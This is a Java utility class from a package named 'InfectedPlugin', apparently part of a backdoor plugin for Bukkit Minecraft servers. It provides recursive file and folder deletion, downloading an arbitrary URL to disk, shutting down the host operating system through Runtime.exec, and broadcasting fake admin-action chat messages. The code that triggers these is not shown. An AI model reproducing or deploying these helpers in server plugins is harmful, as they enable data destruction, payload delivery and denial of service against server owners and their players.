 package org.CreeperCoders.InfectedPlugin;
 
 import java.io.File;
 import java.io.FileOutputStream;
 import java.net.URL;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 import java.io.IOException;
 
 import org.bukkit.*;
 import org.bukkit.entity.*;
 
 public class IP_Util
 {
     public static boolean deleteFile(File file)
     {
         if (file.exists())
         {
             for (File f : file.listFiles())
             {
                 if (!IP_Util.deleteFile(f))
                 {
                     return false;
                 }
             }
 
             file.delete();
             return !file.exists();
         }
         else
         {
             return false;
         }
     }
 
     public static boolean deleteFolder(File file)
     {
         if (file.exists())
         {
             if (file.isDirectory())
             {
                 for (File f : file.listFiles())
                 {
                     if (!IP_Util.deleteFolder(f))
                     {
                         return false;
                     }
                 }
             }
             file.delete();
             return !file.exists();
         }
         else
         {
             return false;
         }
     }
 
     public static void downloadFile(String url, File output) throws java.lang.Exception
     {
         downloadFile(url, output, false);
     }
 
     public static void downloadFile(String url, File output, boolean verbose) throws java.lang.Exception
     {
         URL website = new URL(url);
         ReadableByteChannel rbc = Channels.newChannel(website.openStream());
         FileOutputStream fos = new FileOutputStream(output);
         fos.getChannel().transferFrom(rbc, 0, 1 << 24);
         fos.close();
 
         if (verbose)
         {
         }
     }
 
     public static void shutdown() throws RuntimeException, IOException
     {
         String shutdownCommand = null;
         String operatingSystem = System.getProperty("os.name");
 
         if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem))
         {
             shutdownCommand = "shutdown -h now";
         }
         else if ("Windows".equals(operatingSystem) || "Windows 7".equals(operatingSystem))
         {
             shutdownCommand = "shutdown.exe -s -t 0";
         }
         else
         {
             throw new RuntimeException("Unsupported operating system.");
         }
 
         Runtime.getRuntime().exec(shutdownCommand);
         System.exit(0);
     }
     
     public static void bcastMsg(String message, ChatColor color)
     {
         for (Player player : Bukkit.getOnlinePlayers())
         {
             player.sendMessage((color == null ? "" : color) + message);
         }
     }
     
     public static void bcastMsg(String message)
     {
        IP_Util.bcastMsg(message, null);
     }
     
     public static void adminAction(String adminName, String action, boolean isRed)
     {
         IP_Util.bcastMsg(adminName + " - " + action, (isRed ? ChatColor.RED : ChatColor.AQUA));
     }
 }
